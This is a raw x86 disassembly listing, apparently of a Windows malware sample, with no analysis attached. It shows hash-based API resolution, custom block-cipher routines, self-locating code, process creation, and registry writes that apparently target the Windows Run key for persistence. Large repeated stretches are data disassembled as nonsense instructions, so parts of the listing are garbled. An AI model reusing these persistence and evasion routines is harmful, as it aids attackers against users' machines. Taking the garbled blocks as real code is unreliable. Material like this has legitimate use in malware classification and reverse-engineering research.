mov eax [ edi ]
mov edx [ edi + 0x4 ]
xor eax [ edi - 0x10 ]
xor edx [ edi - 0xc ]
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
mov eax [ edi + 0x8 ]
mov edx [ edi + 0xc ]
xor eax [ edi - 0x8 ]
xor edx [ edi - 0x4 ]
mov [ esi + 0x10 ] eax
mov [ esi + 0x14 ] edx
add ebp 0x8
add esi 0x8
add edi 0x18
mov eax [ esp + 0x30 ]
call [ eax + 0x109 ]
add ebp 0x8
xchg edi esi
mov eax [ esp + 0x30 ]
call [ eax + 0x109 ]
mov edi [ esp + 0x2c ]
mov esi edi
add esi 0x40
mov ecx 0x10
lodsd [ esi ]
bswap eax
stosd [ edi ]
sub ecx 0x1
jne rwxdata
lea edi [ esi - 0x30 ]
mov ecx 0x4
sub esi 0x10
[ edi ] [ esi ]
xor ebx ebx
mov eax [ esp + 0x30 ]
mov ecx [ eax + 0x119 ]
movzx esi [ ebx + ecx ]
mov ecx [ eax + 0x115 ]
movzx edx [ ebx + ecx ]
add esi [ esp + 0x2c ]
call [ eax + 0x10d ]
add edi 0x8
mov eax [ esp + 0x30 ]
mov ecx [ eax + 0x119 ]
movzx esi [ ebx + ecx + 0x1 ]
mov ecx [ eax + 0x115 ]
movzx edx [ ebx + ecx + 0x1 ]
add esi [ esp + 0x2c ]
call [ eax + 0x10d ]
add ebx 0x2
add edi 0x8
cmp ebx 0x1e
jl rwxdata
xor eax eax
mov edi [ esp + 0x2c ]
mov ecx 0x10
[ edi ]
popad
leave
retn 0xc
sub_40a4cd
push ebp
mov ebp esp
pushad
cld
mov edi [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
mov ebp [ ebp + 0x10 ]
add ebp 0x40
mov eax [ edi ]
mov edx [ edi + 0x4 ]
xor eax [ ebp ]
xor edx [ ebp + 0x4 ]
mov [ esi ] eax
mov [ esi + 0x4 ] edx
mov eax [ edi + 0x8 ]
mov edx [ edi + 0xc ]
xor eax [ ebp + 0x8 ]
xor edx [ ebp + 0xc ]
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
lea edi [ esi + 0x8 ]
add ebp 0x10
mov eax [ esp + 0x34 ]
mov ebx [ eax + 0x111 ]
mov dh 0x3
mov eax [ esp + 0x34 ]
call [ eax + 0x109 ]
add ebp 0x8
xchg edi esi
mov eax [ esp + 0x34 ]
call [ eax + 0x109 ]
add ebp 0x8
xchg edi esi
sub dl 0x1
jne rwxdata
mov eax [ esi ]
mov ecx [ ebp + 0xc ]
and eax [ ebp ]
or ecx [ esi + 0xc ]
bswap eax
xor ecx [ esi + 0x8 ]
rol eax 0x1
mov [ esi + 0x8 ] ecx
bswap eax
and ecx [ ebp + 0x8 ]
xor eax [ esi + 0x4 ]
bswap ecx
mov [ esi + 0x4 ] eax
rol ecx 0x1
or eax [ ebp + 0x4 ]
bswap ecx
xor [ esi ] eax
xor [ esi + 0xc ] ecx
add ebp 0x10
sub dh 0x1
jne rwxdata
mov dl 0x3
mov dl 0x3
mov eax [ esp + 0x34 ]
call [ eax + 0x109 ]
add ebp 0x8
xchg edi esi
mov eax [ esp + 0x34 ]
call [ eax + 0x109 ]
add ebp 0x8
xchg edi esi
sub dl 0x1
jne rwxdata
mov eax [ esi ]
mov ebx [ esi + 0x4 ]
mov ecx [ esi + 0x8 ]
mov edx [ esi + 0xc ]
xor eax [ ebp + 0x8 ]
xor ebx [ ebp + 0xc ]
xor ecx [ ebp ]
xor edx [ ebp + 0x4 ]
mov [ esi ] ecx
mov [ esi + 0x4 ] edx
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] ebx
popad
leave
retn 0x10
sub_40a5b9
push ebp
mov ebp esp
pushad
cld
mov edi [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
mov ebp [ ebp + 0x10 ]
add ebp 0x140
mov eax [ edi ]
mov edx [ edi + 0x4 ]
xor eax [ ebp ]
xor edx [ ebp + 0x4 ]
mov [ esi ] eax
mov [ esi + 0x4 ] edx
mov eax [ edi + 0x8 ]
mov edx [ edi + 0xc ]
xor eax [ ebp + 0x8 ]
xor edx [ ebp + 0xc ]
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
lea edi [ esi + 0x8 ]
sub ebp 0x8
mov eax [ esp + 0x34 ]
mov ebx [ eax + 0x111 ]
mov dh 0x3
mov eax [ esp + 0x34 ]
call [ eax + 0x109 ]
sub ebp 0x8
xchg edi esi
mov eax [ esp + 0x34 ]
call [ eax + 0x109 ]
sub ebp 0x8
xchg edi esi
sub dl 0x1
jne rwxdata
mov eax [ esi ]
mov ecx [ ebp - 0x4 ]
and eax [ ebp ]
or ecx [ esi + 0xc ]
bswap eax
xor ecx [ esi + 0x8 ]
rol eax 0x1
mov [ esi + 0x8 ] ecx
bswap eax
and ecx [ ebp - 0x8 ]
xor eax [ esi + 0x4 ]
bswap ecx
mov [ esi + 0x4 ] eax
rol ecx 0x1
or eax [ ebp + 0x4 ]
bswap ecx
xor [ esi ] eax
xor [ esi + 0xc ] ecx
sub ebp 0x10
sub dh 0x1
jne rwxdata
mov dl 0x3
mov dl 0x3
mov eax [ esp + 0x34 ]
call [ eax + 0x109 ]
sub ebp 0x8
xchg edi esi
mov eax [ esp + 0x34 ]
call [ eax + 0x109 ]
sub ebp 0x8
xchg edi esi
sub dl 0x1
jne rwxdata
mov eax [ esi ]
mov ebx [ esi + 0x4 ]
mov ecx [ esi + 0x8 ]
mov edx [ esi + 0xc ]
xor eax [ ebp ]
xor ebx [ ebp + 0x4 ]
xor ecx [ ebp - 0x8 ]
xor edx [ ebp - 0x4 ]
mov [ esi ] ecx
mov [ esi + 0x4 ] edx
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] ebx
popad
leave
retn 0x10
sub_40a6a9
mov eax [ esi ]
xor eax [ ebp ]
xlat
ror eax 0x8
xlat
rol al 0x1
ror eax 0x8
xlat
ror al 0x1
rol ah 0x1
ror eax 0x8
xlat
xor [ edi ] eax
rol eax 0x8
xor [ edi ] eax
rol eax 0x8
xor [ edi + 0x4 ] eax
rol eax 0x8
xor [ edi ] eax
xor [ edi + 0x4 ] eax
mov eax [ esi + 0x4 ]
xor eax [ ebp + 0x4 ]
xlat
rol al 0x1
ror eax 0x8
xlat
ror al 0x1
rol ah 0x1
ror eax 0x8
xlat
ror eax 0x8
xlat
ror eax 0x8
mov cl al
xor cl ah
ror eax 0x10
xor cl al
xor cl ah
mov ch cl
xor ax cx
rol eax 0x10
xor ax cx
xor [ edi ] eax
xor [ edi + 0x4 ] eax
retn
sub_40a91f
push ebx
mov ebx [ esi + 0x8d1 ]
mov ecx [ esi + 0x8d5 ]
mov edx [ ebx + esi + 0x8d9 ]
mov eax [ ebx + esi + 0x8dd ]
rol edx 0x13
rol eax 0x1b
add edx [ ecx + esi + 0x8d9 ]
add eax [ ecx + esi + 0x8dd ]
mov [ ebx + esi + 0x8d9 ] eax
mov [ ebx + esi + 0x8dd ] edx
sub ebx 0x8
jae rwxdata
sub ecx 0x8
jae rwxdata
mov ebx 0x80
mov [ esi + 0x8d1 ] ebx
mov [ esi + 0x8d5 ] ecx
pop ebx
retn
mov ecx 0x80
sub_40aa0f
call [ ebp - 0xedf ]
mov [ ebp - 0x4a9 ] eax
call sub_40aa26
outsb
je rwxdata
or bh [ ebx + 0x2200a50a ]
cld
mov edx ebx
mov ebx 0xd500b10a
mov edx 0xabb0e9b
mov ch 0x0
cmp al 0xc8
movsd [ edi ] [ esi ]
imul edi [ ebx + 0x1b00b90a ] 0xffffffc4
cwde
je rwxdata
insb
insb
add bh bh
xchg ebp eax
and ecx esi
idiv bh
call [ ebx + 0x6a ]
add bh bh
ror [ ecx + 0x5ce8fc45 ] 0x1
add [ eax ] eax
add bh ah
inc ebx
mov ecx 0x850abb20
add [ ebp - 0x44979db6 ] bl
or ah [ ecx - 0x3ec94600 ]
or bh [ ebp + 0x64a3e800 ]
dec ecx
mov ebx 0x6500c10a
jg rwxdata
or bl [ ecx ]
xchg ebx eax
ja rwxdata
iretd
mov bh 0x88
ror [ edx ] cl
cmp [ eax ] eax
and [ ebx + 0x4200690a ] edi
popfd
test [ ebp + 0x710abb ] eax
xor [ ebx ] ebp
dec ebx
pop ecx
mov edi 0x8e005d0a
sub eax 0xabf8210
popad
add [ esi - 0x59 ] dl
sbb [ ebx + 0x650abf ] ebp
or dh al
or bl [ ebx ]
cmp [ ebp - 0x11 ] 0xcf80abb
pop edx
popad
fcom [ ebx + edi * 4 + 0xa ]
cld
or al 0x0
add [ eax ] al
add [ edi - 0x73 ] bl
mov ch 0x84
ja rwxdata
xor [ edi + 0xabf9cb3 ] dl
insd
add dh cl
int1
frstor [ ebx - 0x41 ]
or bh [ ecx ]
js rwxdata
or ah [ ebp ]
mov ebx 0x23007d0a
and eax 0xabf696c
jne rwxdata
scasd [ edi ]
add bl [ eax ]
test bl dl
or dh [ ecx ]
add [ ecx - 0x2c32e6aa ] bl
or dh [ 0x4cca2800 ]
cli
ror [ edx ] cl
inc ecx
add [ eax - 0x2cd37ddf ] bl
or al [ ebp ]
call 0xffffffffd43c7e2d
or cl [ ecx ]
aam 0xfa
sahf
xor al 0xd3
or cl [ ebp ]
cmp ecx [ ecx ]
sub_40aa26
call [ ebp - 0xedf ]
mov [ ebp - 0x4a1 ] eax
call sub_40aa3e
jne rwxdata
call 0xffffffffbb8a0f54
or al cl
add [ ebp + 0x7f ] ah
dec edx
jb rwxdata
call sub_40abd0
out 0x43 eax
xor al [ eax ]
mov ecx 0x850abb20
add [ ebp - 0x44979db6 ] bl
or ah [ ecx - 0x3ec94600 ]
or bh [ ebx + 0x2200a50a ]
cld
mov edx ebx
mov ebx 0xd500b10a
mov edx 0xabb0e9b
mov ch 0x0
cmp al 0xc8
movsd [ edi ] [ esi ]
imul edi [ ebx + 0x1b00b90a ] 0xffffffc4
cwde
je rwxdata
idiv bh
call [ ebx + 0x6a ]
add bh bh
ror [ ecx + 0x5ce8fc45 ] 0x1
add [ eax ] eax
add bh ah
inc ebx
or bh [ ebp + 0x64a3e800 ]
dec ecx
mov ebx 0x6500c10a
jg rwxdata
or bl [ ecx ]
xchg ebx eax
ja rwxdata
iretd
mov bh 0x88
ror [ edx ] cl
cmp [ eax ] eax
and [ ebx + 0x4200690a ] edi
popfd
test [ ebp + 0x710abb ] eax
xor [ ebx ] ebp
dec ebx
pop ecx
mov edi 0x8e005d0a
sub eax 0xabf8210
popad
add [ esi - 0x59 ] dl
sbb [ ebx + 0x650abf ] ebp
or dh al
or bl [ ebx ]
cmp [ ebp - 0x11 ] 0xcf80abb
pop edx
popad
fcom [ ebx + edi * 4 + 0xa ]
cld
or al 0x0
add [ eax ] al
add [ edi - 0x73 ] bl
mov ch 0x84
ja rwxdata
xor [ edi + 0xabf9cb3 ] dl
insd
add dh cl
int1
frstor [ ebx - 0x41 ]
or bh [ ecx ]
js rwxdata
or ah [ ebp ]
mov ebx 0x23007d0a
and eax 0xabf696c
jne rwxdata
scasd [ edi ]
add bl [ eax ]
test bl dl
or dh [ ecx ]
add [ ecx - 0x2c32e6aa ] bl
or dh [ 0x4cca2800 ]
cli
ror [ edx ] cl
inc ecx
add [ eax - 0x2cd37ddf ] bl
or al [ ebp ]
call 0xffffffffd43c7e2d
or cl [ ecx ]
aam 0xfa
sahf
xor al 0xd3
or cl [ ebp ]
cmp ecx [ ecx ]
sub_40aa3e
call [ ebp - 0xedf ]
mov [ ebp - 0x4bd ] eax
push 0x4dcf392
push [ ebp - 0x4c1 ]
push 0x0
call sub_40a249
push 0xff
lea ebx [ ebp - 0x9ca ]
push ebx
push 0x0
call eax
mov [ ebp - 0x4 ] eax
call sub_40abd0
out 0x43 eax
mov ecx 0x850abb20
add [ ebp - 0x44979db6 ] bl
or ah [ ecx - 0x3ec94600 ]
or bh [ ebx + 0x2200a50a ]
cld
mov edx ebx
mov ebx 0xd500b10a
mov edx 0xabb0e9b
mov ch 0x0
cmp al 0xc8
movsd [ edi ] [ esi ]
imul edi [ ebx + 0x1b00b90a ] 0xffffffc4
cwde
je rwxdata
idiv bh
call [ ebx + 0x6a ]
add bh bh
ror [ ecx + 0x5ce8fc45 ] 0x1
add [ eax ] eax
add bh ah
inc ebx
or bh [ ebp + 0x64a3e800 ]
dec ecx
mov ebx 0x6500c10a
jg rwxdata
or bl [ ecx ]
xchg ebx eax
ja rwxdata
iretd
mov bh 0x88
ror [ edx ] cl
cmp [ eax ] eax
and [ ebx + 0x4200690a ] edi
popfd
test [ ebp + 0x710abb ] eax
xor [ ebx ] ebp
dec ebx
pop ecx
mov edi 0x8e005d0a
sub eax 0xabf8210
popad
add [ esi - 0x59 ] dl
sbb [ ebx + 0x650abf ] ebp
or dh al
or bl [ ebx ]
cmp [ ebp - 0x11 ] 0xcf80abb
pop edx
popad
fcom [ ebx + edi * 4 + 0xa ]
cld
or al 0x0
add [ eax ] al
add [ edi - 0x73 ] bl
mov ch 0x84
ja rwxdata
xor [ edi + 0xabf9cb3 ] dl
insd
add dh cl
int1
frstor [ ebx - 0x41 ]
or bh [ ecx ]
js rwxdata
or ah [ ebp ]
mov ebx 0x23007d0a
and eax 0xabf696c
jne rwxdata
scasd [ edi ]
add bl [ eax ]
test bl dl
or dh [ ecx ]
add [ ecx - 0x2c32e6aa ] bl
or dh [ 0x4cca2800 ]
cli
ror [ edx ] cl
inc ecx
add [ eax - 0x2cd37ddf ] bl
or al [ ebp ]
call 0xffffffffd43c7e2d
or cl [ ecx ]
aam 0xfa
sahf
xor al 0xd3
or cl [ ebp ]
cmp ecx [ ecx ]
sub_40abd0
pop edi
lea esi [ ebp - 0xf7c ]
call $+5
pop esi
add esi 0x1fb
lea edi [ ebp - 0xf7c ]
movzx eax [ edi + 0x4 ]
push [ edi ]
push [ eax + esi ]
push 0x0
call sub_40a249
movzx edx [ edi + 0x6 ]
mov [ edx + esi ] eax
add edi 0x8
jmp rwxdata
movzx eax [ esi ]
movzx ecx [ esi + 0x2 ]
add esi 0x4
add eax edi
push ecx
push ecx
push esi
push eax
call [ ebp - 0xed3 ]
pop ecx
add esi ecx
cmp [ esi ] 0x0
jne rwxdata
add esi 0x2
mov [ ebp - 0x8 ] esi
cmp [ edi ] 0x0
je rwxdata
push 0xff
lea eax [ ebp - 0x9ca ]
push eax
lea edi [ ebp - 0x8cb ]
push edi
call [ ebp - 0xed3 ]
cmp [ ebp - 0xb86 ] 0x1
jne rwxdata
movzx eax [ esi ]
movzx ecx [ esi + 0x2 ]
add esi 0x4
mov [ eax + edi ] esi
add esi ecx
jmp rwxdata
call sub_40acd8
popad
jbe rwxdata
push 0x1
lea eax [ ebp - 0xf7c ]
push eax
mov esi [ ebp - 0x8 ]
add esi 0x4
call esi
push 0x3921bf03
push [ ebp - 0x4c1 ]
push 0x0
call sub_40a249
call eax
push eax
call [ ebp - 0x48c ]
sub eax 0x3
mov ecx [ ebp - 0x4 ]
cmp ecx eax
jne rwxdata
cmp [ esi ] 0x0
je rwxdata
je rwxdata
popad
arpl [ ebx ] bp
lea eax [ ebp - 0xfd0 ]
push eax
lea eax [ ebp - 0xfc0 ]
push eax
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0xb6d ]
push eax
push ebx
call [ ebp - 0xf4f ]
jmp rwxdata
popad
leave
retn
push [ ebp - 0x4 ]
call [ ebp - 0xedb ]
cmp [ ebp - 0x274 ] 0x1
je rwxdata
call $+5
pop eax
sub eax 0x11ce
push [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0xf7c ]
push eax
call [ ebp - 0x278 ]
lea esi [ ebp - 0xf7c ]
call $+5
pop edi
sub edi 0x1157
call sub_40ada7
fld [ eax ]
push ecx
add eax 0x4b00e9
in eax 0x0
popfd
add ch bl
add dl ch
add ch bh
add [ edx - 0x13fefeff ] bl
add [ 0x900ef01 ] al
add [ esi ] esp
or eax 0x11006b01
add [ eax ] eax
add [ 0x19001e01 ] edx
add [ esi ] ebx
add [ 0x59000001 ] bl
cmp [ ebp - 0xea7 ] 0x0
je rwxdata
movzx edx [ ecx + 0x2 ]
add edi edx
add ecx 0x4
jmp rwxdata
push esi
call [ ebp - 0xea3 ]
jmp rwxdata
push esi
call [ ebp - 0xea7 ]
movzx edx [ ecx ]
mov [ edx + esi ] edi
cmp [ ecx + 0x2 ] 0x0
je rwxdata
sub_40acd8
call [ ebp - 0xedf ]
push 0x7e04376b
push eax
push 0x0
call sub_40a249
push 0x0
push 0x0
call eax
mov [ ebp - 0x6cd ] al
push 0xe6e5030e
push [ ebp - 0x4a1 ]
push 0x0
call sub_40a249
or eax eax
jne rwxdata
mov [ ebp - 0xef3 ] eax
lea eax [ ebp - 0xb81 ]
push eax
push 0x0
push 0x0
call [ ebp - 0xef7 ]
mov [ ebp - 0x4 ] eax
call [ ebp - 0xef3 ]
cmp eax 0xb7
je rwxdata
push 0x87d52c94
push [ ebp - 0x4c1 ]
push 0x0
call sub_40a249
popad
leave
retn
push [ ebp - 0x4 ]
call [ ebp - 0xedb ]
cmp [ ebp - 0x274 ] 0x1
je rwxdata
call $+5
pop eax
sub eax 0x11ce
push [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0xf7c ]
push eax
call [ ebp - 0x278 ]
lea esi [ ebp - 0xf7c ]
call $+5
pop edi
sub edi 0x1157
call sub_40ada7
fld [ eax ]
push ecx
add eax 0x4b00e9
in eax 0x0
popfd
add ch bl
add dl ch
add ch bh
add [ edx - 0x13fefeff ] bl
add [ 0x900ef01 ] al
add [ esi ] esp
or eax 0x11006b01
add [ eax ] eax
add [ 0x19001e01 ] edx
add [ esi ] ebx
add [ 0x59000001 ] bl
cmp [ ebp - 0xea7 ] 0x0
je rwxdata
movzx edx [ ecx + 0x2 ]
add edi edx
add ecx 0x4
jmp rwxdata
push esi
call [ ebp - 0xea3 ]
jmp rwxdata
push esi
call [ ebp - 0xea7 ]
movzx edx [ ecx ]
mov [ edx + esi ] edi
cmp [ ecx + 0x2 ] 0x0
je rwxdata
sub_40ada7
pop ecx
cmp [ ebp - 0xea7 ] 0x0
je rwxdata
movzx edx [ ecx + 0x2 ]
add edi edx
add ecx 0x4
jmp rwxdata
push esi
call [ ebp - 0xea3 ]
jmp rwxdata
push esi
call [ ebp - 0xea7 ]
movzx edx [ ecx ]
mov [ edx + esi ] edi
cmp [ ecx + 0x2 ] 0x0
je rwxdata
popad
leave
retn
sub_40aec5
inc [ ebp + 0x1 ]
or [ eax ] al
insd
outsb
jne rwxdata
add [ eax ] al
popad
jae rwxdata
add [ eax - 0x1 ] dl
jne rwxdata
push edi
imul ebp [ esi + 0x64 ] 0x5c73776f
inc ebx
jne rwxdata
jb rwxdata
or [ 0x12010001 ] ecx
push cs
adc eax [ eax ]
push ebx
insd
insd
jo rwxdata
push eax
push [ ebp - 0x4 ]
call [ esi + 0x3d ]
push [ ebp - 0x4 ]
add [ eax ] al
jb rwxdata
add [ eax ] al
imul ebp [ edi + 0x6e ] 0x6e75525c
jne rwxdata
imul ebp [ esi + 0x75 ] 0x74732078
jne rwxdata
cmp [ esi + 0x3f8 ] 0x1
jne rwxdata
push esi
call [ esi + 0xd00 ]
jle rwxdata
push ebp
mov ebp esp
mov esi [ ebp + 0x8 ]
cmp [ esi + 0x3f7 ] 0x0
outsb
je rwxdata
cmp [ esi + 0x3f6 ] 0x1
jne rwxdata
mov eax 0x1
cmp [ esi + 0x3f7 ] 0x0
jle rwxdata
mov ecx 0x80000001
mov ecx 0x80000002
jmp rwxdata
add [ edi - 0x1 ] dl
xchg esi eax
add [ eax ] 0xbe800000
scasd [ edi ]
or [ eax ] al
add [ ecx ] al
jne rwxdata
outsb
push ebx
dec edi
inc esi
push esp
push edi
inc ecx
push edx
inc ebp
pop esp
dec ebp
imul esp [ ebx + 0x72 ] 0x666f736f
je rwxdata
imul ebp [ edi + 0x46 ] 0x3fb796c
or [ eax ] eax
cmp [ edx ] esi
xor dh [ edx ]
xor ah [ ebx + 0x63 ]
xor [ 0xd0a0000 ] esi
mov eax [ 0xffffffffec8b5500 ]
add esp 0xfffffffc
mov esi [ ebp + 0x8 ]
push 0xff
lea edi [ esi + 0xd13 ]
push edi
call [ esi + 0xad ]
call sub_40af4f
call [ esi + 0x31 ]
leave
retn 0x4
cld
jb rwxdata
cmp [ esi + 0xd09 ] 0x1
jne rwxdata
push 0x0
push esi
call [ esi + 0xf5 ]
or eax eax
je rwxdata
lea edi [ esi + 0x6b1 ]
push edi
lea edi [ esi + 0x5b2 ]
push edi
call [ esi + 0xcd ]
lea eax [ ebp - 0x4 ]
push eax
push 0xf003f
push 0x0
push edi
push ecx
call [ esi + 0x35 ]
push 0xff
lea eax [ esi + 0x6b1 ]
push eax
push 0x1
push 0x0
lea eax [ esi + 0xe12 ]
cmp [ esi + 0x3fa ] 0x1
jne rwxdata
push esi
call [ esi + 0xd0a ]
lea edi [ esi + 0x5b2 ]
push edi
call [ esi + 0x51 ]
cmp [ esi + 0xd08 ] 0x1
jne rwxdata
lea eax [ esi + 0x8bd ]
push eax
push 0x0
push esi
push [ esi + 0xd0e ]
push 0x0
push 0x0
call [ esi + 0x29 ]
leave
retn 0x4
cmp [ esi + 0x3f9 ] 0x1
jne rwxdata
push esi
call [ esi + 0xf1 ]
lea eax [ esi + 0x8c1 ]
push eax
push 0x0
push esi
push [ esi + 0xf9 ]
push 0x0
push 0x0
call [ esi + 0x29 ]
sub_40af4f
push edi
call [ esi + 0x81 ]
cmp [ esi + 0x8af ] 0x1
jne rwxdata
mov ecx 0x80000001
mov ecx 0x80000002
jmp rwxdata
lea eax [ ebp - 0x4 ]
push eax
push 0xf003f
push 0x0
push edi
push ecx
call [ esi + 0x35 ]
push 0xff
lea eax [ esi + 0x6b1 ]
push eax
push 0x1
push 0x0
lea eax [ esi + 0xe12 ]
push eax
push [ ebp - 0x4 ]
call [ esi + 0x3d ]
push [ ebp - 0x4 ]
call [ esi + 0x31 ]
leave
retn 0x4
sub_40afa2
aad 0x0
lds eax [ eax ]
push ebp
mov ebp esp
mov esi [ ebp + 0x8 ]
cmp [ esi + 0x3f7 ] 0x0
jle rwxdata
cmp [ esi + 0x3f8 ] 0x1
jne rwxdata
push esi
call [ esi + 0xd00 ]
cmp [ esi + 0x3f6 ] 0x1
jne rwxdata
mov eax 0x1
cmp [ esi + 0x3f7 ] 0x0
jle rwxdata
cmp [ esi + 0xd09 ] 0x1
jne rwxdata
push 0x0
push esi
call [ esi + 0xf5 ]
or eax eax
je rwxdata
lea edi [ esi + 0x6b1 ]
push edi
lea edi [ esi + 0x5b2 ]
push edi
call [ esi + 0xcd ]
cmp [ esi + 0x3fa ] 0x1
jne rwxdata
push esi
call [ esi + 0xd0a ]
lea edi [ esi + 0x5b2 ]
push edi
call [ esi + 0x51 ]
cmp [ esi + 0xd08 ] 0x1
jne rwxdata
lea eax [ esi + 0x8bd ]
push eax
push 0x0
push esi
push [ esi + 0xd0e ]
push 0x0
push 0x0
call [ esi + 0x29 ]
leave
retn 0x4
cmp [ esi + 0x3f9 ] 0x1
jne rwxdata
push esi
call [ esi + 0xf1 ]
lea eax [ esi + 0x8c1 ]
push eax
push 0x0
push esi
push [ esi + 0xf9 ]
push 0x0
push 0x0
call [ esi + 0x29 ]
j_sub_4014ac
jmp sub_4014ac
sub_401b25
mov eax [ 0xffffffffdb4052a2 ]
mov eax [ 0x2e926b0c ]
pop esp
or bl ah
mov al [ 0xffffffffa61de35e ]
popad
mov ebx 0x1ddb08d8
cmpsb [ esi ] [ edi ]
xchg ecx eax
retn 0x1d63
sub_403000
mov eax [ Ordinal_MFC42_1842@IAT ]
retn
sub_403010
mov eax rwxdata
retn
sub_403020
mov eax [ Ordinal_MFC42_4242@IAT ]
retn
sub_403030
mov eax rwxdata
retn
sub_4030a0
push esi
mov esi ecx
call sub_4030c0
test [ esp + 0x8 ] 0x1
je rwxdata
mov eax esi
pop esi
retn 0x4
push esi
call Ordinal_MFC42_825
add esp 0x4
sub_403200
mov eax [ esp + 0x4 ]
push eax
call Ordinal_MFC42_5252
neg eax
sbb eax eax
neg eax
retn 0x4
sub_403220
mov eax [ esp + 0x4 ]
push eax
call Ordinal_MFC42_825
pop ecx
retn 0x4
sub_403230
retn
sub_403240
retn 0x4
sub_403250
mov eax [ Ordinal_MFC42_4274@IAT ]
retn
sub_403260
mov eax rwxdata
retn
sub_403270
push esi
mov esi ecx
push 0x0
call Ordinal_MFC42_561
mov [ esi ] rwxdata
mov eax esi
pop esi
retn
sub_403290
push esi
mov esi ecx
call sub_4032b0
test [ esp + 0x8 ] 0x1
je rwxdata
mov eax esi
pop esi
retn 0x4
push esi
call Ordinal_MFC42_825
add esp 0x4
sub_4032b0
jmp Ordinal_MFC42_815
sub_4032c0
call sub_4032d0
jmp sub_4032e0
sub_4032d0
mov ecx rwxdata
jmp sub_403270
sub_4032e0
push sub_4032f0
call sub_4043bc
pop ecx
retn
sub_4032f0
mov ecx rwxdata
jmp sub_4032b0
sub_403420
push esi
push 0x0
mov esi ecx
push 0x64
call Ordinal_MFC42_324
mov [ esi ] rwxdata
mov eax esi
pop esi
retn
sub_403440
push esi
mov esi ecx
call sub_403460
test [ esp + 0x8 ] 0x1
je rwxdata
mov eax esi
pop esi
retn 0x4
push esi
call Ordinal_MFC42_825
add esp 0x4
sub_403460
jmp Ordinal_MFC42_641
sub_403470
mov eax [ Ordinal_MFC42_4234@IAT ]
retn
sub_403480
mov eax rwxdata
retn
sub_4034f0
mov eax [ ecx + 0x20 ]
push 0x0
push eax
call [ EnableWindow@IAT ]
retn
sub_403500
mov eax [ ecx + 0x20 ]
push 0x1
push eax
call [ EnableWindow@IAT ]
retn
sub_403570
mov eax [ Ordinal_MFC42_1825@IAT ]
retn
sub_403580
mov eax rwxdata
retn
sub_403590
mov eax [ Ordinal_MFC42_4238@IAT ]
retn
sub_4035a0
mov eax rwxdata
retn
sub_4035b0
push esi
mov esi ecx
call Ordinal_MFC42_338
mov [ esi ] rwxdata
mov eax esi
pop esi
retn
sub_4035d0
push esi
mov esi ecx
call sub_4035f0
test [ esp + 0x8 ] 0x1
je rwxdata
mov eax esi
pop esi
retn 0x4
push esi
call Ordinal_MFC42_825
add esp 0x4
sub_4035f0
mov [ ecx ] rwxdata
jmp Ordinal_MFC42_652
sub_403600
call Ordinal_MFC42_4823
neg eax
sbb eax eax
neg eax
retn
sub_403610
retn 0x4
sub_403620
mov eax [ ecx + 0x48 ]
retn
sub_403630
mov eax [ esp + 0x4 ]
mov [ ecx + 0x48 ] eax
retn 0x4
sub_4036a0
mov eax [ Ordinal_MFC42_1945@IAT ]
retn
sub_4036b0
mov eax rwxdata
retn
sub_4036c0
mov eax [ Ordinal_MFC42_4273@IAT ]
retn
sub_4036d0
mov eax rwxdata
retn
sub_4036e0
push esi
mov esi ecx
call Ordinal_MFC42_560
mov [ esi ] rwxdata
mov eax esi
pop esi
retn
sub_403700
push esi
mov esi ecx
call sub_403720
test [ esp + 0x8 ] 0x1
je rwxdata
mov eax esi
pop esi
retn 0x4
push esi
call Ordinal_MFC42_825
add esp 0x4
sub_403720
mov [ ecx ] rwxdata
jmp Ordinal_MFC42_813
sub_403730
push esi
mov esi ecx
call sub_403770
sub_403750
mov eax [ esp + 0x4 ]
push eax
call Ordinal_MFC42_2535
retn 0x4
sub_403760
retn 0x8
Ordinal_MFC42_823
jmp [ Ordinal_MFC42_823@IAT ]
Ordinal_MFC42_2723
jmp [ Ordinal_MFC42_2723@IAT ]
Ordinal_MFC42_2390
jmp [ Ordinal_MFC42_2390@IAT ]
Ordinal_MFC42_3059
jmp [ Ordinal_MFC42_3059@IAT ]
Ordinal_MFC42_5100
jmp [ Ordinal_MFC42_5100@IAT ]
Ordinal_MFC42_5103
jmp [ Ordinal_MFC42_5103@IAT ]
Ordinal_MFC42_4467
jmp [ Ordinal_MFC42_4467@IAT ]
Ordinal_MFC42_4303
jmp [ Ordinal_MFC42_4303@IAT ]
Ordinal_MFC42_3350
jmp [ Ordinal_MFC42_3350@IAT ]
Ordinal_MFC42_5012
jmp [ Ordinal_MFC42_5012@IAT ]
Ordinal_MFC42_975
jmp [ Ordinal_MFC42_975@IAT ]
Ordinal_MFC42_5472
jmp [ Ordinal_MFC42_5472@IAT ]
Ordinal_MFC42_3403
jmp [ Ordinal_MFC42_3403@IAT ]
Ordinal_MFC42_2879
jmp [ Ordinal_MFC42_2879@IAT ]
Ordinal_MFC42_2878
jmp [ Ordinal_MFC42_2878@IAT ]
Ordinal_MFC42_4151
jmp [ Ordinal_MFC42_4151@IAT ]
Ordinal_MFC42_6055
jmp [ Ordinal_MFC42_6055@IAT ]
Ordinal_MFC42_4077
jmp [ Ordinal_MFC42_4077@IAT ]
Ordinal_MFC42_1776
jmp [ Ordinal_MFC42_1776@IAT ]
Ordinal_MFC42_4407
jmp [ Ordinal_MFC42_4407@IAT ]
Ordinal_MFC42_5237
jmp [ Ordinal_MFC42_5237@IAT ]
Ordinal_MFC42_2385
jmp [ Ordinal_MFC42_2385@IAT ]
Ordinal_MFC42_5163
jmp [ Ordinal_MFC42_5163@IAT ]
Ordinal_MFC42_6374
jmp [ Ordinal_MFC42_6374@IAT ]
Ordinal_MFC42_4353
jmp [ Ordinal_MFC42_4353@IAT ]
Ordinal_MFC42_5282
jmp [ Ordinal_MFC42_5282@IAT ]
Ordinal_MFC42_2649
jmp [ Ordinal_MFC42_2649@IAT ]
Ordinal_MFC42_1665
jmp [ Ordinal_MFC42_1665@IAT ]
Ordinal_MFC42_3798
jmp [ Ordinal_MFC42_3798@IAT ]
Ordinal_MFC42_4837
jmp [ Ordinal_MFC42_4837@IAT ]
Ordinal_MFC42_4436
